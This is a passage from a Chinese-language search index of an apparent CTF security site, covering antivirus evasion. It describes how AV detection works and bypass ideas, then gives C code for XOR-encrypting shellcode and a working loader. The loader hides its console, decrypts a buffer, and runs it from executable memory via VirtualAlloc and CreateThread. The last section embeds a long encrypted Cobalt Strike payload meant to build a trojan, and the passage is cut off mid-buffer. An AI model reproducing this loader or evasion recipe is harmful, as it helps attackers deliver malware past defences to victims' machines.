\u901a\u8fc7\u4e00\u4e9b\u51b7\u95e8\u7684\u6267\u884c\u65b9\u5f0f\u6267\u884cshellcode\n9.\u81ea\u5df1\u5199/\u4e8c\u5f00\u8fdc\u63a7\u7b49\u7b49...\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#2","title":"2.\u6740\u8f6f\u7684\u4ecb\u7ecd","text":"<pre><code>\u6740\u8f6f\u6392\u540d\u4ecb\u7ecd\nhttps://www.maigoo.com/maigoo/055soft_index.html\nVT\u67e5\u6740\nhttps://www.virustotal.com/gui/home/upload\nhttps://www.virscan.org\n\u5fae\u6b65\u4e91\u6c99\u7bb1\nhttps://s.threatbook.com\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#21","title":"2.1\u6740\u8f6f\u7684\u67e5\u6740\u57fa\u672c\u539f\u7406","text":"<p>\u5e38\u89c1\u7684\u6740\u6bd2\u8f6f\u4ef6\u5bf9\u7a0b\u5e8f\u7684\u5212\u5206\u5927\u81f4\u5206\u4e3a\u4e09\u79cd</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#_1","title":"\u65e0\u5bb3","text":"<p>\u6ca1\u6709\u4efb\u4f55\u7684\u53ef\u7591\u884c\u4e3a , \u6ca1\u6709\u4efb\u4f55\u7684\u7279\u5f81\u7b26\u5408\u75c5\u6bd2\u6216\u6728\u9a6c</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#_2","title":"\u53ef\u7591","text":"<p>\u5b58\u5728\u53ef\u7591\u884c\u4e3a\uff1a\u64cd\u4f5c\u6ce8\u518c\u8868\uff0c\u6253\u5f00powershell\uff0c\u4fee\u6539\u7528\u6237\uff0c\u64cd\u4f5c\u654f\u611f\u6587\u4ef6\u7b49</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#_3","title":"\u5b58\u5728\u6728\u9a6c\u75c5\u6bd2","text":"<p>\u7279\u5f81\u7b26\u5408\u6728\u9a6c\u6216\u8005\u75c5\u6bd2\u3002</p> <p>\u6740\u8f6f\u5e38\u7528\u8bc6\u522b\u6076\u610f\u6837\u672c\u7684\u65b9\u5f0f\uff1a</p> <ul> <li> <p>\u9759\u6001\u67e5\u6740</p> </li> <li> <p>\u52a8\u6001\u67e5\u6740 ( \u542f\u53d1\u5f0f\u67e5\u6740 )</p> </li> </ul>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#22","title":"2.2\u9759\u6001\u67e5\u6740","text":"<p>\u9759\u6001\u67e5\u6740\u901a\u5e38\u4f1a\u4f7f\u7528\u75c5\u6bd2\u7279\u5f81\u5e93\uff0c\u8fd9\u662f\u4e00\u4e2a\u5305\u542b\u75c5\u6bd2\u3001\u6076\u610f\u8f6f\u4ef6\u6216\u5176\u4ed6\u5a01\u80c1\u7684\u7279\u5b9a\u6807\u8bc6\u7684\u6570\u636e\u5e93\u3002\u8fd9\u4e9b\u7279\u5b9a\u6807\u8bc6\u53ef\u4ee5\u662f\u6587\u4ef6\u7684 \u7279\u5b9a\u4ee3\u7801\u7247\u6bb5 \u3001 \u72ec\u7279\u7684\u5b57\u7b26\u4e32 \u3001 \u6587\u4ef6\u7ed3\u6784 \u7b49\u3002\u6740\u6bd2\u8f6f\u4ef6\u901a\u8fc7\u6bd4\u5bf9\u6587\u4ef6\u7684\u8fd9\u4e9b\u7279\u5f81\u4e0e\u7279\u5f81\u5e93\u4e2d\u5b58\u5728\u7684\u4fe1\u606f\u662f\u5426\u5339\u914d\uff0c\u6765\u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u6076\u610f\u7684\u3002</p> <p>\u9759\u6001\u67e5\u6740\u5927\u90fd\u662f\u57fa\u4e8e\u6837\u672c\u7279\u5f81\u7801\u7684\u67e5\u6740, \u5e38\u89c1\u7684\u6709360\u62a5\u6bd2</p> <p></p> <p>\u6bd4\u5982, \u4e0a\u8282\u8bfe\u5236\u4f5c\u7684\u52a0\u8f7d\u5668, \u5176\u7279\u5f81\u65e9\u5df2\u7ecf\u88ab\u6807\u8bb0\u4e86 HEUR, Trojan \u4ee5\u53ca</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#1_1","title":"1.\u4ee3\u7801\u4e2d\u7684\u51fd\u6570","text":"<p>\u6740\u8f6f\u4f1a\u901a\u8fc7\u53cd\u7f16\u8bd1/\u67e5\u770bexe\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f\u67e5\u770b\u4ee3\u7801 , \u53ef\u4ee5\u770b\u5230\u91cc\u9762\u7684\u4e00\u4e9b\u51fd\u6570\u548c\u6c47\u7f16\u4ee3\u7801\uff0c\u6bd4\u5982:<code>virtualalloc</code>\uff0c<code>rtlmovememory</code>\uff0c<code>creatthread</code> \u7b49\u3002 \u4e3b\u8981\u90fd\u662f windows api \u51fd\u6570\uff0c\u5c24\u5176\u662f\u548c\u5185\u5b58\u3001\u5806\u3001\u7ebf\u7a0b\u76f8\u5173\u7684\u51fd\u6570\u3002</p> <pre><code>\u5371\u9669\u51fd\u6570  \u8fdc\u63a7\u5173\u952e\u8bcd(msf , cobaltstrike)  \u4e00\u4e9b\u5173\u952e\u5b57(shellcode) \u7b49 \n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#2shellcode","title":"2.shellcode\u7684\u7279\u5f81","text":"<pre><code>\\xfc\\x48\\x83...     //\u8fd9\u662fCS\u5236\u4f5c\u7684shellcode\u7684\u660e\u663e\u7279\u5f81\u7801\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#3md5","title":"3.\u6587\u4ef6\u540d\u548cmd5","text":"<p>RLO\uff08Right-to-Left Override\uff09\u7ffb\u8f6c\u662f\u4e00\u79cd\u5b57\u7b26\u7f16\u7801\u6f0f\u6d1e\u5229\u7528\u6280\u672f\uff0c\u901a\u5e38\u4e0eUnicode\u5b57\u7b26U+202E\u76f8\u5173\u3002\u8fd9\u4e2a\u5b57\u7b26\u88ab\u7528\u6765\u6539\u53d8\u6587\u672c\u7684\u663e\u793a\u65b9\u5411\uff0c\u7279\u522b\u662f\u5728\u963f\u62c9\u4f2f\u8bed\u548c\u5e0c\u4f2f\u6765\u8bed\u7b49\u4ece\u53f3\u5411\u5de6\u4e66\u5199\u7684\u8bed\u8a00\u4e2d\u3002</p> <p>\u9ed1\u5ba2\u53ef\u4ee5\u6ee5\u7528RLO\u5b57\u7b26\u6765\u4f2a\u88c5\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u8fbe\u5230\u6df7\u6dc6\u6216\u6b3a\u9a97\u7528\u6237\u7684\u76ee\u7684\u3002\u4f8b\u5982\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6587\u4ef6\u540d\u8bbe\u7f6e\u4e3aevil.exe\uff0c\u5e76\u901a\u8fc7RLO\u5b57\u7b26\u5c06\u5176\u663e\u793a\u4e3a exe.livem\uff0c\u4f7f\u6587\u4ef6\u770b\u8d77\u6765\u50cf\u662f\u65e0\u5bb3\u7684\u6587\u672c\u6587\u4ef6\u6216\u56fe\u50cf\u3002\u5f53\u7528\u6237\u6253\u5f00\u5b83\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u6267\u884c\u4e86\u6076\u610f\u7a0b\u5e8f\u3002</p> <p>\u6740\u6bd2\u8f6f\u4ef6\u4f1a\u76f4\u63a5\u5220\u9664\u6216\u62e6\u622a\u542b\u6709RLO\u5b57\u7b26\u7684\u6587\u4ef6\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u8fd9\u79cd\u6280\u672f\u5e38\u5e38\u4e0e\u9493\u9c7c\u653b\u51fb\u6216\u6076\u610f\u8f6f\u4ef6\u4f2a\u88c5\u6709\u5173\u3002\u4e00\u65e6RLO\u5b57\u7b26\u88ab\u68c0\u6d4b\u5230\uff0c\u5b83\u53ef\u80fd\u8868\u660e\u6587\u4ef6\u88ab\u6076\u610f\u4fee\u6539\uff0c\u4ee5\u7ed5\u8fc7\u7528\u6237\u6216\u5b89\u5168\u8f6f\u4ef6\u7684\u68c0\u6d4b\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u9632\u6b62\u6f5c\u5728\u7684\u5b89\u5168\u5a01\u80c1\uff0c\u6740\u6bd2\u8f6f\u4ef6\u4f1a\u5c06\u4f7f\u7528RLO\u5b57\u7b26\u7684\u6587\u4ef6\u8bc6\u522b\u4e3a\u53ef\u7591\u5e76\u7acb\u5373\u5904\u7406\u3002</p> <p>\u5982\u679c\u8fd9\u4e2a\u6587\u4ef6\u540d\u4f7f\u7528\u4e86rlo\u7ffb\u8f6c\u7684\u8bdd , \u65e0\u8bba\u662f\u5426\u662f\u75c5\u6bd2\u90fd\u4f1a\u76f4\u63a5\u6740 , md5\u503c\u7684\u8bdd\u5c31\u662f\u5339\u914d\u6837\u672c\u5e93\u4e2d\u7684md5\u503c , \u770b\u662f\u5426\u5b58\u5728</p> <pre><code>demo.txt.exe  --&gt; demo.exe.txt\n</code></pre> <p>\u67e5\u770b\u6587\u4ef6 md5 hash</p> <pre><code>CertUtil -hashfile \u6587\u4ef6\u8def\u5f84 md5\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#4","title":"4.\u52a0\u5bc6(\u53ef\u7591)","text":"<p>\u4f7f\u7528\u52a0\u5bc6\u89e3\u5bc6\u884c\u4e3a\u6216\u8005\u5bf9\u6587\u4ef6\u6709\u989d\u5916\u4fdd\u62a4\u63aa\u65bd(\u52a0\u58f3)</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#5","title":"5.\u6570\u5b57\u7b7e\u540d","text":"<p>\u5224\u65ad\u5f53\u524d\u7a0b\u5e8f\u7684\u6570\u5b57\u7b7e\u540d\u662f\u5426\u6b63\u5e38</p> <pre><code>\u6b63\u89c4\u7684\u7a0b\u5e8f , \u90fd\u662f\u6709\u6570\u5b57\u7b7e\u540d\u7684\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#6","title":"6.\u8d44\u6e90\u6587\u4ef6","text":"<p>\u6307\u4e00\u4e2a\u8f6f\u4ef6\u7684\u4e00\u4e9b\u56fe\u6807\u4fe1\u606f, \u4ea7\u54c1\u540d\u79f0, \u4ea7\u54c1\u7248\u672c, \u6587\u4ef6\u7248\u672c, \u7248\u6743, \u8bed\u8a00\u7b49\u4fe1\u606f</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#23","title":"2.3\u52a8\u6001\u67e5\u6740","text":"<p>\u901a\u5e38\u8fd9\u4e00\u6b65\u90fd\u662f\u9759\u6001\u5206\u6790\u4e4b\u540e\u505a\u7684\uff0c\u5927\u591a\u6740\u6bd2\u8f6f\u4ef6\u4f1a\u6709\u4e91\u6c99\u7bb1 , \u76f8\u5f53\u4e8e\u5f00\u4e00\u4e2a\u865a\u62df\u673a\u8fd0\u884c\u4e00\u4e0b\u4f60\u7684\u6076\u610f\u6837\u672c, \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\u6307\u4ee4\u51fa\u73b0\u7684\u987a\u5e8f\uff0c\u6216\u8005\u7279\u5b9a\u7684\u7ec4\u5408\u60c5\u51b5\u4ee5\u53ca\u6240\u8c03\u7528\u7684\u51fd\u6570\u53ca\u5176\u53c2\u6570\u7b49\u5c5e\u4e8e\u6076\u610f\u884c\u4e3a\u7279\u5f81\uff0c\u6765\u5224\u65ad\u76ee\u6807\u7a0b\u5e8f\u662f\u4e0d\u662f\u75c5\u6bd2\u7a0b\u5e8f\u3002</p> <p>\u76f8\u6bd4\u4e8e\u9759\u6001\u67e5\u6740\uff0c\u52a8\u6001\u67e5\u6740\u66f4\u5173\u6ce8\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\uff0c\u5141\u8bb8\u68c0\u6d4b\u548c\u5206\u6790\u672a\u77e5\u7684\u3001\u53ef\u80fd\u662f\u6076\u610f\u7684\u884c\u4e3a\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#1_2","title":"1.\u8ba1\u7b97\u673a\u76f8\u5173","text":"<p>\u901a\u5e38\u7531r1\u6216r2\u5c42\u6302\u76d1\u63a7\u7684\u65b9\u5f0f\uff08\u7c7b\u4f3c\u4e8ehook\uff09\u5f53\u89e6\u53d1\u8fd9\u4e9b\u6761\u4ef6\u5c31\u4f1a\u4ea7\u751f\u4e8b\u4ef6 , \u4f8b\u5982 : 360\u4f1a\u5728\u7cfb\u7edf\u7684\u5185\u6838\u5c42\u4f1a\u5bf9\u6ce8\u518c\u8868\u548cnet1.exe\u8fdb\u884c\u76d1\u63a7 , \u6ce8\u518c\u8868\u7684\u76d1\u63a7\u76f8\u5bf9\u4e0d\u90a3\u4e48\u4e25\u683c , \u53ef\u4ee5\u901a\u8fc7 win32 api \u6dfb\u52a0\u7528\u6237 , \u901a\u5e38\u6740\u8f6f\u76d1\u63a7\u7684\u6709</p> <pre><code>\u670d\u52a1\n\u6ce8\u518c\u8868\n\u7ec4\u7b56\u7565\n\u9632\u706b\u5899\n\u654f\u611f\u7a0b\u5e8f : cmd powershell wmi psexec bitsadmin rundll\u7b49\n\u7528\u6237 : \u6dfb\u52a0\uff0c\u5220\u9664\uff0c\u4fee\u6539\u7b49\u64cd\u4f5c\n\u6587\u4ef6\u5939 :\nC:\\windows\\system32 \nC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup %tmp% \u7b49\u654f\u611f\u6587\u4ef6\u5939\n</code></pre> <p>\u5e38\u89c1\u7684\u7ed5\u8fc7\u601d\u8def : \u66ff\u6362\u65b9\u5f0f\u65b9\u6cd5 , cmd\u7528\u4e0d\u4e86 , \u6362powershell(\u6df7\u6dc6,\u7f16\u7801,\u52a0\u5bc6), \u6362windows api\u51fd\u6570 , \u6216\u8005\u7528shellcode</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#2_1","title":"2.\u7f51\u7edc\u76f8\u5173","text":"<pre><code>iP\uff0c\u57df\u540d\uff0c\u8bc1\u4e66\n\u67e5\u627e\u901a\u8baf\u7684ip\u6216\u57df\u540d\u662f\u5426\u4e4b\u524d\u5b58\u5728\u653b\u51fb\u884c\u4e3a\n\n\u6d41\u91cf\u5185\u5bb9\n\u65f6\u95f4\u7279\u5f81\uff1a\u626b\u63cf\u7b49, \u5927\u89c4\u6a21\u626b\u63cf\u6216\u5176\u4ed6\u4e0d\u5bfb\u5e38\u7684\u7f51\u7edc\u884c\u4e3a\n\u5185\u5bb9\u7279\u5f81\uff1adata\u5b57\u6bb5\u4e2d\u662f\u5426\u5b58\u5728\u547d\u4ee4\u63a7\u5236\u76f8\u5173\u7684\u5173\u952e\u8bcd\u6216\u6216\u8005\u52a0\u5bc6\u7279\u5f81\n\u7ed3\u6784\u7279\u5f81\uff1a\u662f\u5426\u5b58\u5728\u5df2\u77e5\u8fdc\u63a7\u7684\u901a\u8baf\u7ed3\u6784\u7279\u5f81 \\x00\\x00\\0x00\\x00\n</code></pre> <p>\u5e38\u89c1\u7684\u7ed5\u8fc7\u601d\u8def \uff1a</p> <p>tcp\u5206\u6bb5\uff0c\u5185\u5bb9\u52a0\u5bc6\uff0c\u4f7f\u7528\u5408\u6cd5\u8bc1\u4e66\u7b49</p> <p>\u8865\u5145 : \u6709\u4e9b\u6740\u8f6f\u53ef\u80fd\u6ca1\u6709\u90a3\u4e48\u5f3a , \u4f46\u662f\u603b\u4f53\u6740\u8f6f\u8bc6\u522b\u7684\u5c31\u662f\u8fd9\u4e2a\u5927\u6982\u601d\u8def</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#24","title":"2.4\u6837\u672c\u542f\u52a8\u6d41\u7a0b","text":"<p>\u4e91\u5b89\u5168\u6821\u9a8c\u5176\u5b9e\u5c31\u662f\u628a\u6837\u672c\u4e0a\u4f20\u5230\u4e86\u81ea\u5df1\u7684\u4e91\u6c99\u7bb1, \u8fd0\u884c, \u68c0\u6d4b, \u5206\u6790</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#3shellcode","title":"3.shellcode\u5904\u7406","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#31shellcode","title":"3.1shellcode\u52a0\u5bc6","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#1_3","title":"1.\u5f02\u6216\u52a0\u5bc6","text":"<p>\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u65b9\u4fbf\u7684shellcode\u5904\u7406\u65b9\u5f0f</p> <pre><code>#include &lt;windows.h&gt; // \u5305\u542bWindows API\u5934\u6587\u4ef6\n#include &lt;stdio.h&gt;   // \u5305\u542b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u51fd\u6570\u7684\u5934\u6587\u4ef6\n\n// \u5f02\u6216\u52a0\u5bc6\u51fd\u6570\nvoid myXor(unsigned char str[], int len, int key) {\n    for (int i = 0; i &lt; len; i++) {\n        str[i] = str[i] ^ key; // \u5bf9\u6bcf\u4e2a\u5b57\u8282\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\n    }\n}\n\nint main() {\n    int key = 123; // \u5b9a\u4e49\u5f02\u6216\u52a0\u5bc6/\u89e3\u5bc6\u7684\u5bc6\u94a5\n    unsigned char buf[] = \"\\xfc\\x48\\x83\"; // \u5b9a\u4e49\u4e00\u4e2a\u5305\u542bshellcode\u7684\u5b57\u8282\u6570\u7ec4\n\n    printf(\"\u539f\u59cbshellcode:\\r\\n\"); // \u6253\u5370\u539f\u59cbshellcode\u7684\u63d0\u793a\u4fe1\u606f\n    for (int i = 0; i &lt; sizeof(buf) - 1; i++) { // -1\u662f\u56e0\u4e3abuf\u5305\u542b\u4e86\u7ec8\u6b62\u7684'\\0'\u5b57\u7b26\n        printf(\"\\\\x%02x\", buf[i]); // \u4ee516\u8fdb\u5236\u683c\u5f0f\u6253\u5370\u6bcf\u4e2a\u5b57\u8282\n    }\n\n    myXor(buf, sizeof(buf) - 1, key); // \u5bf9shellcode\u8fdb\u884c\u5f02\u6216\u52a0\u5bc6\n    printf(\"\\r\\n\\r\\n\u5f02\u6216\u540e\u7684shellcode:\\r\\n\"); // \u6253\u5370\u5f02\u6216\u540e\u7684shellcode\u63d0\u793a\u4fe1\u606f\n    for (int i = 0; i &lt; sizeof(buf) - 1; i++) {\n        printf(\"\\\\x%02x\", buf[i]); // \u4ee516\u8fdb\u5236\u683c\u5f0f\u6253\u5370\u6bcf\u4e2a\u5b57\u8282\n    }\n\n    myXor(buf, sizeof(buf) - 1, key); // \u5bf9shellcode\u8fdb\u884c\u5f02\u6216\u89e3\u5bc6\uff08\u540c\u6837\u7684\u64cd\u4f5c\u53ef\u4ee5\u6062\u590d\u539f\u59cb\u6570\u636e\uff09\n    printf(\"\\r\\n\\r\\n\u7b2c\u4e8c\u6b21\u5f02\u6216\u540e\u7684shellcode:\\r\\n\"); // \u6253\u5370\u7b2c\u4e8c\u6b21\u5f02\u6216\u540e\u7684shellcode\u63d0\u793a\u4fe1\u606f\n    for (int i = 0; i &lt; sizeof(buf) - 1; i++) {\n        printf(\"\\\\x%02x\", buf[i]); // \u4ee516\u8fdb\u5236\u683c\u5f0f\u6253\u5370\u6bcf\u4e2a\u5b57\u8282\n    }\n}\n</code></pre> <p>\u5982\u679c\u5b9e\u6218\u4e2d, \u4e00\u6b21\u7b80\u5355\u7684\u5f02\u6216\u4ecd\u7136\u88ab\u67e5\u6740, \u53ef\u4ee5\u5c1d\u8bd5\u591a\u6b21\u5f02\u6216, \u53ea\u8981\u4e24\u6b21\u7684\u5f02\u6216\u4f7f\u7528\u7684key\u4e0d\u540c\u5373\u53ef\u3002</p> <p>\u4f7f\u7528Python\u7f16\u5199\u7684xor\u5de5\u5177 \uff0c \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a raw\u7684shellcode, \u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u5f02\u6216\u4f7f\u7528\u7684key, \u8303\u56f4\u57281-255</p> <pre><code>xor.exe payload.bin 99\n</code></pre> <p></p> <p>\u52a0\u8f7d\u5668\uff1a\u8be5\u4ee3\u7801\u7684\u6838\u5fc3\u76ee\u7684\u662f\u901a\u8fc7\u5f02\u6216\u89e3\u5bc6\u7684\u65b9\u5f0f\uff0c\u5c06\u52a0\u5bc6\u540e\u7684shellcode\u89e3\u5bc6\u5e76\u6267\u884c\u3002\u901a\u8fc7VirtualAlloc\u7533\u8bf7\u4e00\u5757\u53ef\u6267\u884c\u7684\u5185\u5b58\uff0c\u5c06\u89e3\u5bc6\u540e\u7684shellcode\u590d\u5236\u8fdb\u53bb\uff0c\u5e76\u901a\u8fc7\u521b\u5efa\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6267\u884c\u5b83\u3002</p> <pre><code>#include &lt;windows.h&gt; // \u5305\u542bWindows API\u51fd\u6570\n#include &lt;stdio.h&gt;   // \u5305\u542b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u51fd\u6570\n\n// \u901a\u8fc7\u7f16\u8bd1\u5668\u6307\u4ee4\u9690\u85cf\u63a7\u5236\u53f0\u7a97\u53e3\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n\n// \u5f02\u6216\u52a0\u5bc6/\u89e3\u5bc6\u51fd\u6570\nvoid myXor(unsigned char str[], int len, int key) {\n    for (int i = 0; i &lt; len; ++i) {\n        str[i] = str[i] ^ key; // \u5bf9\u6bcf\u4e2a\u5b57\u8282\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\n    }\n}\n\n// \u52a0\u5bc6\u540e\u7684shellcode\uff08\u7528\u5f02\u6216\u540e\u7684\u6570\u636e\u8868\u793a\uff0c\u9700\u89e3\u5bc6\u624d\u80fd\u6267\u884c\uff09\nunsigned char buf[] = \"\\x87\\x33\\xf8\\x9f\\x8b...\"; // \u8fd9\u91cc\u5e94\u8be5\u653e\u5b9e\u9645\u7684\u5f02\u6216\u540e\u7684shellcode\n\nint main() {\n    // \u4f7f\u7528123\u4f5c\u4e3a\u5f02\u6216\u5bc6\u94a5\u8fdb\u884c\u89e3\u5bc6\n    int key = 123;\n    myXor(buf, sizeof(buf), key); // \u5bf9shellcode\u8fdb\u884c\u5f02\u6216\u89e3\u5bc6\n\n    // \u4f7f\u7528VirtualAlloc\u51fd\u6570\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u5927\u5c0f\u4e3a\u89e3\u5bc6\u540e\u7684shellcode\u957f\u5ea6\uff0c\u6743\u9650\u4e3a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\n    LPVOID addr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n    // \u5982\u679c\u5185\u5b58\u7533\u8bf7\u5931\u8d25\uff0c\u7a0b\u5e8f\u9000\u51fa\n    if (addr == NULL) {\n        return 1; // \u8fd4\u56de\u9519\u8bef\u4ee3\u78011\uff0c\u8868\u793a\u5185\u5b58\u5206\u914d\u5931\u8d25\n    }\n\n    // \u5c06\u89e3\u5bc6\u540e\u7684shellcode\u62f7\u8d1d\u5230\u7533\u8bf7\u7684\u5185\u5b58\u5757\u4e2d\n    memcpy(addr, buf, sizeof(buf));\n\n    // \u521b\u5efa\u7ebf\u7a0b\uff0c\u6267\u884c\u89e3\u5bc6\u540e\u7684shellcode\uff0c\u5730\u5740\u4e3a\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5730\u5740\n    HANDLE hThread = CreateThread(\n        NULL,                // \u9ed8\u8ba4\u5b89\u5168\u5c5e\u6027\n        NULL,                // \u9ed8\u8ba4\u5806\u6808\u5927\u5c0f\n        (LPTHREAD_START_ROUTINE)addr, // \u7ebf\u7a0b\u5f00\u59cb\u6267\u884c\u7684\u51fd\u6570\u5730\u5740\uff08\u5373shellcode\u7684\u8d77\u59cb\u5730\u5740\uff09\n        NULL,                // \u4f20\u9012\u7ed9\u7ebf\u7a0b\u7684\u53c2\u6570\n        NULL,                // \u7ebf\u7a0b\u521b\u5efa\u540e\u7acb\u5373\u8fd0\u884c\n        0                    // \u7ebf\u7a0bID\n    );\n\n    // \u7b49\u5f85\u7ebf\u7a0b\u6267\u884c\u5b8c\u6210\n    WaitForSingleObject(hThread, INFINITE); // \u7b49\u5f85\u7ebf\u7a0b\u6267\u884c\u5b8c\u6210\uff0c\u65f6\u95f4\u4e3a\u65e0\u9650\uff08-1\uff09\n\n    // \u5173\u95ed\u7ebf\u7a0b\u53e5\u67c4\n    CloseHandle(hThread);\n\n    return 0; // \u6b63\u5e38\u9000\u51fa\u7a0b\u5e8f\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#_4","title":"\u68c0\u9a8c","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#1cspayload","title":"1.CS\u7f16\u5199payload","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#2payload","title":"2.\u5bf9payload\u8fdb\u884c\u591a\u6b21\u5f02\u6216","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#3","title":"3.\u52a0\u8f7d\u5668\u751f\u6210\u6076\u610f\u6728\u9a6c\u6587\u4ef6","text":"<pre><code>#include &lt;windows.h&gt; // \u5305\u542bWindows API\u51fd\u6570\n#include &lt;stdio.h&gt;   // \u5305\u542b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u51fd\u6570\n\n// \u901a\u8fc7\u7f16\u8bd1\u5668\u6307\u4ee4\u9690\u85cf\u63a7\u5236\u53f0\u7a97\u53e3\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n\n// \u5f02\u6216\u52a0\u5bc6/\u89e3\u5bc6\u51fd\u6570\nvoid myXor(unsigned char str[], int len, int key) {\n  for (int i = 0; i &lt; len; ++i) {\n    str[i] = str[i] ^ key; // \u5bf9\u6bcf\u4e2a\u5b57\u8282\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\n  }\n}\n\n// \u52a0\u5bc6\u540e\u7684shellcode\uff08\u7528\u5f02\u6216\u540e\u7684\u6570\u636e\u8868\u793a\uff0c\u9700\u89e3\u5bc6\u624d\u80fd\u6267\u884c\uff09\nunsigned char buf[] = \"\\x87\\x33\\xf8\\x9f\\x8b\\x93\\xb3\\x7b\\x7b\\x7b\\x3a\\x2a\\x3a\\x2b\\x29\\x2a\\x2d\\x33\\x4a\\xa9\\x1e\\x33\\xf0\\x29\\x1b\\x33\\xf0\\x29\\x63\\x33\\xf0\\x29\\x5b\\x33\\xf0\\x09\\x2b\\x33\\x74\\xcc\\x31\\x31\\x36\\x4a\\xb2\\x33\\x4a\\xbb\\xd7\\x47\\x1a\\x07\\x79\\x57\\x5b\\x3a\\xba\\xb2\\x76\\x3a\\x7a\\xba\\x99\\x96\\x29\\x3a\\x2a\\x33\\xf0\\x29\\x5b\\xf0\\x39\\x47\\x33\\x7a\\xab\\x1d\\xfa\\x03\\x63\\x70\\x79\\x0e\\x09\\xf0\\xfb\\xf3\\x7b\\x7b\\x7b\\x33\\xfe\\xbb\\x0f\\x1c\\x33\\x7a\\xab\\x2b\\xf0\\x33\\x63\\x3f\\xf0\\x3b\\x5b\\x32\\x7a\\xab\\x98\\x2d\\x33\\x84\\xb2\\x3a\\xf0\\x4f\\xf3\\x33\\x7a\\xad\\x36\\x4a\\xb2\\x33\\x4a\\xbb\\xd7\\x3a\\xba\\xb2\\x76\\x3a\\x7a\\xba\\x43\\x9b\\x0e\\x8a\\x37\\x78\\x37\\x5f\\x73\\x3e\\x42\\xaa\\x0e\\xa3\\x23\\x3f\\xf0\\x3b\\x5f\\x32\\x7a\\xab\\x1d\\x3a\\xf0\\x77\\x33\\x3f\\xf0\\x3b\\x67\\x32\\x7a\\xab\\x3a\\xf0\\x7f\\xf3\\x33\\x7a\\xab\\x3a\\x23\\x3a\\x23\\x25\\x22\\x21\\x3a\\x23\\x3a\\x22\\x3a\\x21\\x33\\xf8\\x97\\x5b\\x3a\\x29\\x84\\x9b\\x23\\x3a\\x22\\x21\\x33\\xf0\\x69\\x92\\x34\\x84\\x84\\x84\\x26\\x11\\x7b\\x32\\xc5\\x0c\\x12\\x15\\x12\\x15\\x1e\\x0f\\x7b\\x3a\\x2d\\x32\\xf2\\x9d\\x37\\xf2\\x8a\\x3a\\xc1\\x37\\x0c\\x5d\\x7c\\x84\\xae\\x33\\x4a\\xb2\\x33\\x4a\\xa9\\x36\\x4a\\xbb\\x36\\x4a\\xb2\\x3a\\x2b\\x3a\\x2b\\x3a\\xc1\\x41\\x2d\\x02\\xdc\\x84\\xae\\x90\\x08\\x21\\x33\\xf2\\xba\\x3a\\xc3\\xa9\\x7f\\x7b\\x7b\\x36\\x4a\\xb2\\x3a\\x2a\\x3a\\x2a\\x11\\x78\\x3a\\x2a\\x3a\\xc1\\x2c\\xf2\\xe4\\xbd\\x84\\xae\\x90\\x22\\x20\\x33\\xf2\\xba\\x33\\x4a\\xa9\\x32\\xf2\\xa3\\x36\\x4a\\xb2\\x29\\x13\\x7b\\x79\\x3b\\xff\\x29\\x29\\x3a\\xc1\\x90\\x2e\\x55\\x40\\x84\\xae\\x33\\xf2\\xbd\\x33\\xf8\\xb8\\x2b\\x11\\x71\\x24\\x33\\xf2\\x8a\\x33\\xf2\\xa1\\x32\\xbc\\xbb\\x84\\x84\\x84\\x84\\x36\\x4a\\xb2\\x29\\x29\\x3a\\xc1\\x56\\x7d\\x63\\x00\\x84\\xae\\xfe\\xbb\\x74\\xfe\\xe6\\x7a\\x7b\\x7b\\x33\\x84\\xb4\\x74\\xf